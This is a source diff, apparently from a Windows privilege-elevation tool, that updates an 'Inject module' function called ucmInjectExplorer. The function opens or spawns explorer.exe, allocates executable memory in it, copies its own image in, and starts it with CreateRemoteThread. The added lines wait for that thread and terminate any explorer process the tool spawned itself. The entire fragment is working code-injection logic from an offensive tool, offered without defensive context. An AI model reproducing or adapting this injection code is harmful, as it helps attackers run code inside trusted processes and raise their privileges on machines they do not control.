@@ -4,9 +4,9 @@
 *
 *  TITLE:       INJECT.C
 *
-*  VERSION:     1.50
+*  VERSION:     1.60
 *
-*  DATE:        05 Apr 2015
+*  DATE:        20 Apr 2015
 *
 *  Inject module.
 *
@@ -31,7 +31,7 @@ BOOL ucmInjectExplorer(
 	_In_ LPVOID ElevatedLoadProc
 	)
 {
-	BOOL					cond = FALSE, bResult = FALSE;
+	BOOL					cond = FALSE, bResult = FALSE, bZombie = FALSE;
 	DWORD					c;
 	HANDLE					hProcess = NULL, hRemoteThread = NULL;
 	HINSTANCE               selfmodule = GetModuleHandle(NULL);
@@ -55,12 +55,18 @@ BOOL ucmInjectExplorer(
 		//
 		hProcess = supGetExplorerHandle();
 		if (hProcess == NULL) {
+			hProcess = supRunProcessEx(L"explorer.exe", NULL, NULL);
+			if (hProcess != NULL) {
+				bZombie = TRUE;
+			}
+		}
+		if (hProcess == NULL) {
 			OutputDebugString(TEXT("[UCM] Cannot open target process."));
 			break;
 		}
 
 		//
-		// Allocate buffer in target process and write itself inside
+		// Allocate buffer in target process and write itself inside.
 		//
 		remotebuffer = VirtualAllocEx(hProcess, NULL, (SIZE_T)opth->SizeOfImage,
 			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -83,6 +89,7 @@ BOOL ucmInjectExplorer(
 		hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
 		bResult = (hRemoteThread != NULL);
 		if (bResult) {
+			WaitForSingleObject(hRemoteThread, INFINITE);
 			CloseHandle(hRemoteThread);
 		}
 
@@ -92,6 +99,9 @@ BOOL ucmInjectExplorer(
 	// Close target process handle.
 	//
 	if (hProcess != NULL) {
+		if (bZombie) {
+			TerminateProcess(hProcess, 0);
+		}
 		CloseHandle(hProcess);
 	}
 	return bResult;
